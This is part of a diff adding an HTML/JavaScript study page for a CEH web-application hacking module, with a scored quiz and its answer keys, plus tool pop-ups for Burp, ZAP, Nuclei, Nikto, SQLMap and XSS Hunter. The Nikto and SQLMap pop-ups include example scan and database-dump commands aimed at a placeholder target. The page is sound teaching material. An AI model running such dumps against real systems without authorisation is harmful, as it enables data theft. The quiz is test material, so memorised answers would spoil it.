+                explanation: "CSP provides a powerful defense against XSS attacks by allowing developers to specify which resources can be loaded and executed by the browser."
+            },
+            {
+                question: "Which vulnerability allows attackers to access files outside the web root directory?",
+                options: [
+                    "SQL Injection",
+                    "Directory Traversal",
+                    "Cross-Site Scripting",
+                    "CSRF"
+                ],
+                correct: 1,
+                explanation: "Directory Traversal (Path Traversal) vulnerabilities allow attackers to access files and directories outside the intended web root, potentially exposing sensitive system files."
+            },
+            {
+                question: "What is the recommended approach for secure password storage?",
+                options: [
+                    "Plain text storage",
+                    "MD5 hashing",
+                    "Bcrypt with salt",
+                    "Base64 encoding"
+                ],
+                correct: 2,
+                explanation: "Bcrypt with salt is recommended for password storage as it's specifically designed for password hashing with built-in salting and adaptive work factor to resist brute force attacks."
+            },
+            {
+                question: "Which HTTP status code indicates a successful authentication?",
+                options: [
+                    "200 OK",
+                    "201 Created",
+                    "401 Unauthorized",
+                    "403 Forbidden"
+                ],
+                correct: 0,
+                explanation: "200 OK indicates successful authentication and authorization. 401 indicates authentication failure, while 403 indicates successful authentication but insufficient authorization."
+            },
+            {
+                question: "What is the main difference between authentication and authorization?",
+                options: [
+                    "Authentication is for users, authorization is for systems",
+                    "Authentication verifies identity, authorization controls access",
+                    "Authentication is optional, authorization is mandatory",
+                    "There is no significant difference"
+                ],
+                correct: 1,
+                explanation: "Authentication verifies who you are (identity verification), while authorization determines what you can access or do (permission control) after successful authentication."
+            },
+            {
+                question: "Which AI-powered capability is NEW in CEH v13 for web application testing?",
+                options: [
+                    "Automated scanning",
+                    "Vulnerability reporting",
+                    "Smart payload generation",
+                    "Manual testing assistance"
+                ],
+                correct: 2,
+                explanation: "CEH v13 introduces AI-powered smart payload generation that creates context-aware attack vectors based on application behavior and machine learning algorithms."
+            },
+            {
+                question: "What is the primary risk of Server-Side Request Forgery (SSRF)?",
+                options: [
+                    "Client-side code execution",
+                    "Database compromise",
+                    "Internal network access",
+                    "Session hijacking"
+                ],
+                correct: 2,
+                explanation: "SSRF allows attackers to make requests from the server to internal networks or services, potentially accessing restricted resources and compromising internal systems."
+            },
+            {
+                question: "Which security header helps prevent clickjacking attacks?",
+                options: [
+                    "Content-Security-Policy",
+                    "X-Frame-Options",
+                    "X-XSS-Protection",
+                    "X-Content-Type-Options"
+                ],
+                correct: 1,
+                explanation: "X-Frame-Options prevents clickjacking attacks by controlling whether a page can be displayed in a frame, iframe, embed, or object element on another site."
+            }
+        ];
+
+        // Show specific section
+        function showSection(sectionId) {
+            // Hide all sections
+            document.querySelectorAll('.module-section').forEach(section => {
+                section.classList.remove('active');
+            });
+            
+            // Show selected section
+            document.getElementById(sectionId).classList.add('active');
+            
+            // Update navigation
+            document.querySelectorAll('.nav-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            const targetBtn = document.querySelector(`[onclick="showSection('${sectionId}')"]`);
+            if (targetBtn) {
+                targetBtn.classList.add('active');
+            }
+            
+            // Mark as completed and update progress
+            completedSections.add(currentSection);
+            currentSection = sectionId;
+            updateProgress();
+            
+            // Scroll to top
+            window.scrollTo(0, 0);
+        }
+
+        // Update progress bar
+        function updateProgress() {
+            const progress = (completedSections.size / sectionOrder.length) * 100;
+            const progressBar = document.getElementById('progressBar');
+            const progressText = document.getElementById('progressText');
+            
+            if (progressBar && progressText) {
+                progressBar.style.width = progress + '%';
+                progressText.textContent = `Progress: ${Math.round(progress)}% Complete`;
+            }
+        }
+
+        // Show modal
+        function showModal(title, content) {
+            const modal = document.getElementById('detailModal');
+            const modalContent = document.getElementById('modalContent');
+            if (modal && modalContent) {
+                modalContent.innerHTML = `<h2>${title}</h2>${content}`;
+                modal.style.display = 'block';
+            }
+        }
+
+        // Close modal
+        function closeModal() {
+            const modal = document.getElementById('detailModal');
+            if (modal) {
+                modal.style.display = 'none';
+            }
+        }
+
+        // Show tool details in modal
+        function showToolDetails(toolName) {
+            const toolDetails = {
+                burp: {
+                    title: 'Burp Suite Professional',
+                    content: `
+                        <p><strong>Industry Standard Web Application Security Testing Platform</strong></p>
+                        <h4>Key Features:</h4>
+                        <ul>
+                            <li><strong>Proxy:</strong> Intercept and modify HTTP/HTTPS traffic</li>
+                            <li><strong>Scanner:</strong> Automated vulnerability detection</li>
+                            <li><strong>Intruder:</strong> Customizable attack payload delivery</li>
+                            <li><strong>Repeater:</strong> Manual request manipulation</li>
+                            <li><strong>Sequencer:</strong> Session token analysis</li>
+                            <li><strong>Decoder:</strong> Encoding/decoding utilities</li>
+                        </ul>
+                        <h4>Professional Advantages:</h4>
+                        <ul>
+                            <li>Comprehensive vulnerability scanner</li>
+                            <li>Advanced manual testing capabilities</li>
+                            <li>Extensible through BApp Store</li>
+                            <li>Integration with CI/CD pipelines</li>
+                            <li>Detailed reporting features</li>
+                        </ul>
+                    `
+                },
+                zap: {
+                    title: 'OWASP ZAP (Zed Attack Proxy)',
+                    content: `
+                        <p><strong>Free and Open Source Web Application Security Scanner</strong></p>
+                        <h4>Core Capabilities:</h4>
+                        <ul>
+                            <li><strong>Passive Scanner:</strong> Identifies vulnerabilities without active attacks</li>
+                            <li><strong>Active Scanner:</strong> Performs actual attacks to find vulnerabilities</li>
+                            <li><strong>Spider:</strong> Crawls web applications to map attack surface</li>
+                            <li><strong>Fuzzer:</strong> Tests input validation and error handling</li>
+                            <li><strong>REST API:</strong> Automation and CI/CD integration</li>
+                        </ul>
+                        <h4>Advantages:</h4>
+                        <ul>
+                            <li>Completely free and open source</li>
+                            <li>Regular updates and active community</li>
+                            <li>Docker support for easy deployment</li>
+                            <li>Extensive documentation and tutorials</li>
+                            <li>Plugin architecture for extensibility</li>
+                        </ul>
+                    `
+                },
+                nuclei: {
+                    title: 'Nuclei - Fast Vulnerability Scanner',
+                    content: `
+                        <p><strong>Template-Based Vulnerability Scanner</strong></p>
+                        <h4>Key Features:</h4>
+                        <ul>
+                            <li><strong>YAML Templates:</strong> Easy-to-write vulnerability checks</li>
+                            <li><strong>Community Templates:</strong> 5000+ ready-to-use templates</li>
+                            <li><strong>High Speed:</strong> Parallel scanning capabilities</li>
+                            <li><strong>Custom Logic:</strong> Complex vulnerability detection</li>
+                            <li><strong>Integration Ready:</strong> CI/CD and automation friendly</li>
+                        </ul>
+                        <h4>Use Cases:</h4>
+                        <ul>
+                            <li>Continuous security monitoring</li>
+                            <li>Bug bounty reconnaissance</li>
+                            <li>Infrastructure vulnerability assessment</li>
+                            <li>Custom security check development</li>
+                            <li>Mass vulnerability scanning</li>
+                        </ul>
+                    `
+                },
+                nikto: {
+                    title: 'Nikto Web Scanner',
+                    content: `
+                        <p><strong>Web Server Security Assessment Tool</strong></p>
+                        <h4>Scanning Capabilities:</h4>
+                        <ul>
+                            <li><strong>CGI Vulnerabilities:</strong> Common Gateway Interface security issues</li>
+                            <li><strong>Server Misconfigurations:</strong> Default files and directories</li>
+                            <li><strong>Version Detection:</strong> Server and application fingerprinting</li>
+                            <li><strong>SSL/TLS Testing:</strong> Certificate and configuration analysis</li>
+                            <li><strong>Plugin Support:</strong> Extensible architecture</li>
+                        </ul>
+                        <h4>Command Line Usage:</h4>
+                        <div class="code-block">
+# Basic scan
+nikto -h http://target.com
+
+# Save results
+nikto -h target.com -o results.html -Format html
+
+# Scan with specific plugins
+nikto -h target.com -Plugins @@ALL
+                        </div>
+                    `
+                },
+                sqlmap: {
+                    title: 'SQLMap - SQL Injection Testing Tool',
+                    content: `
+                        <p><strong>Automated SQL Injection Detection and Exploitation</strong></p>
+                        <h4>Advanced Features:</h4>
+                        <ul>
+                            <li><strong>Database Fingerprinting:</strong> Identify DBMS type and version</li>
+                            <li><strong>Data Extraction:</strong> Retrieve database contents</li>
+                            <li><strong>File System Access:</strong> Read/write files on target system</li>
+                            <li><strong>OS Command Execution:</strong> Execute system commands</li>
+                            <li><strong>Out-of-Band Techniques:</strong> DNS and HTTP exfiltration</li>
+                        </ul>
+                        <h4>Usage Examples:</h4>
+                        <div class="code-block">
+# Basic injection test
+sqlmap -u "http://target.com/page.php?id=1"
+
+# Extract database names
+sqlmap -u "target.url" --dbs
+
+# Extract table data
+sqlmap -u "target.url" -D database -T table --dump
+                        </div>
+                    `
+                },
+                xsshunter: {
+                    title: 'XSS Hunter - Blind XSS Detection',
+                    content: `
+                        <p><strong>Blind XSS Detection and Notification Platform</strong></p>
+                        <h4>Key Capabilities:</h4>
+                        <ul>
+                            <li><strong>Blind XSS Detection:</strong> Find XSS in areas not immediately visible</li>
+                            <li><strong>Real-time Notifications:</strong> Email alerts when payload fires</li>
+                            <li><strong>Screenshot Capture:</strong> Visual evidence of successful XSS</li>
+                            <li><strong>Session Information:</strong> Browser, IP, and user agent details</li>
+                            <li><strong>Payload Customization:</strong> Tailored payloads for different contexts</li>
+                        </ul>
+                        <h4>Common Use Cases:</h4>
+                        <ul>
+                            <li>Testing contact forms and feedback systems</li>
+                            <li>Admin panel vulnerability detection</li>
+                            <li>Log file XSS identification</li>
+                            <li>Email template XSS discovery</li>
+                            <li>Third-party integration testing</li>
+                        </ul>
+                    `
+                }
+            };
+
+            const tool = toolDetails[toolName];
+            if (tool) {
+                showModal(tool.title, tool.content);
+            }
+        }
+
+        // Initialize the application
+        document.addEventListener('DOMContentLoaded', function() {
+            updateProgress();
+            setupKeyboardNavigation();
+        });
+
+        // Setup keyboard navigation
+        function setupKeyboardNavigation() {
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    closeModal();
+                } else if (e.key === 'ArrowLeft') {
+                    navigateSection(-1);
+                } else if (e.key === 'ArrowRight') {
+                    navigateSection(1);
+                }
+            });
+        }
+
+        // Navigate between sections
+        function navigateSection(direction) {
+            const currentIndex = sectionOrder.indexOf(currentSection);
+            const newIndex = currentIndex + direction;
+            
+            if (newIndex >= 0 && newIndex < sectionOrder.length) {
+                showSection(sectionOrder[newIndex]);
+            }
+        }
+
+        // Quiz functionality
+        function startQuiz() {
+            quizStartTime = Date.now();
+            document.getElementById('startQuiz').style.display = 'none';
+            document.getElementById('submitQuiz').style.display = 'inline-block';
+            renderQuizQuestions();
+            startQuizTimer();
+        }
+
+        function renderQuizQuestions() {
+            const container = document.getElementById('quizQuestions');
+            let html = '';
+            
+            quizQuestions.forEach((q, index) => {
+                html += `
+                    <div class="question" id="question-${index}">
+                        <h4>Question ${index + 1}: ${q.question}</h4>
+                        <ul class="options">
+                            ${q.options.map((option, i) => 
+                                `<li onclick="selectAnswer(${index}, ${i})" data-question="${index}" data-option="${i}">
+                                    ${String.fromCharCode(65 + i)}. ${option}
+                                </li>`
+                            ).join('')}
+                        </ul>
+                    </div>
+                `;
+            });
+            
+            container.innerHTML = html;
+        }
+
+        function selectAnswer(questionIndex, optionIndex) {
+            // Remove previous selection
+            const questionElement = document.getElementById(`question-${questionIndex}`);
+            questionElement.querySelectorAll('.options li').forEach(li => {
+                li.classList.remove('selected');
+            });
+            
+            // Add selection to clicked option
+            const selectedOption = questionElement.querySelector(`[data-option="${optionIndex}"]`);
+            selectedOption.classList.add('selected');
+            
+            // Store answer
+            quizAnswers[questionIndex] = optionIndex;
+        }
+
+        function startQuizTimer() {
+            const timerDisplay = document.getElementById('quizTimer');
+            timerDisplay.style.display = 'block';
+            
+            quizTimer = setInterval(() => {
+                const elapsed = Date.now() - quizStartTime;
+                const remaining = Math.max(0, quizTimeLimit - elapsed);
+                
+                const minutes = Math.floor(remaining / 60000);
+                const seconds = Math.floor((remaining % 60000) / 1000);
+                
+                timerDisplay.textContent = `Time Remaining: ${minutes}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (remaining === 0) {
+                    clearInterval(quizTimer);
+                    timerDisplay.style.display = 'none';
+                    submitQuiz();
+                }
+            }, 1000);
+        }
+
+        function submitQuiz() {
+            if (quizTimer) {
+                clearInterval(quizTimer);
+                document.getElementById('quizTimer').style.display = 'none';
+            }
+            
+            let correct = 0;
+            const results = [];
+            
+            quizQuestions.forEach((q, index) => {
+                const userAnswer = quizAnswers[index];
+                const isCorrect = userAnswer === q.correct;
+                
+                if (isCorrect) correct++;
+                
+                results.push({
+                    question: q.question,
+                    userAnswer: userAnswer !== undefined ? q.options[userAnswer] : 'Not answered',
+                    correctAnswer: q.options[q.correct],
+                    isCorrect: isCorrect,
+                    explanation: q.explanation
+                });
+                
+                // Visual feedback
+                const questionElement = document.getElementById(`question-${index}`);
+                if (questionElement) {
+                    const options = questionElement.querySelectorAll('.options li');
+                    
+                    options.forEach((option, i) => {
+                        if (i === q.correct) {
+                            option.classList.add('correct');
+                        } else if (i === userAnswer && i !== q.correct) {
+                            option.classList.add('incorrect');
+                        }
+                    });
+                }
+            });
+            
+            quizScore = Math.round((correct / quizQuestions.length) * 100);
+            displayResults(correct, results);
+            
+            // Hide quiz controls
+            document.getElementById('submitQuiz').style.display = 'none';
+            document.getElementById('currentScore').textContent = quizScore + '%';
+        }
+
+        function displayResults(correct, results) {
+            const container = document.getElementById('resultsContainer');
+            const scoreDisplay = document.getElementById('scoreDisplay');
+            const detailedResults = document.getElementById('detailedResults');
+            
+            const passed = quizScore >= 80;
+            const scoreColor = passed ? 'var(--success-color)' : 'var(--accent-color)';
+            
+            scoreDisplay.innerHTML = `
+                <div style="text-align: center; padding: 30px;">
+                    <div style="font-size: 3em; color: ${scoreColor}; margin: 20px 0;">
+                        ${quizScore}%
+                    </div>
+                    <h3 style="color: ${scoreColor};">
+                        ${passed ? 'Congratulations! You Passed!' : 'Keep Learning!'}
+                    </h3>
+                    <p>You answered ${correct} out of ${quizQuestions.length} questions correctly.</p>
+                    ${passed ? 
+                        '<p style="color: var(--success-color);">You have successfully mastered CEH v13 Module 14: Hacking Web Applications!</p>' :
+                        '<p style="color: var(--accent-color);">Review the explanations below and retake the assessment to improve your score.</p>'
+                    }
+                </div>
+            `;
+            
+            let detailsHtml = '<h4>Assessment Results:</h4>';
+            results.forEach((result, index) => {
+                const statusIcon = result.isCorrect ? '✅' : '❌';
+                
+                detailsHtml += `
+                    <div class="card" style="border-left-color: ${result.isCorrect ? 'var(--success-color)' : 'var(--accent-color)'}">
+                        <h5>${statusIcon} Question ${index + 1}</h5>
+                        <p><strong>Question:</strong> ${result.question}</p>
+                        <p><strong>Your Answer:</strong> ${result.userAnswer}</p>
+                        <p><strong>Correct Answer:</strong> ${result.correctAnswer}</p>
+                        <div class="highlight-box" style="margin-top: 15px;">
+                            <strong>Explanation:</strong> ${result.explanation}
+                        </div>
+                    </div>
+                `;
+            });
+            
+            detailedResults.innerHTML = detailsHtml;
+            container.style.display = 'block';
+        }
+
+        function resetQuiz() {
+            quizAnswers = {};
+            quizScore = 0;
+            quizStartTime = null;
+            if (quizTimer) {
+                clearInterval(quizTimer);
+            }
+            document.getElementById('quizTimer').style.display = 'none';
+            document.getElementById('startQuiz').style.display = 'inline-block';
+            document.getElementById('submitQuiz').style.display = 'none';
+            document.getElementById('resultsContainer').style.display = 'none';
+            document.getElementById('quizQuestions').innerHTML = '';
+            document.getElementById('currentScore').textContent = '0';
+        }
+
+        // Click outside modal to close
+        window.onclick = function(event) {
+            const modal = document.getElementById('detailModal');
+            if (event.target === modal) {
+                closeModal();
+            }
+        }
+    </script>
+</body>
+</html>
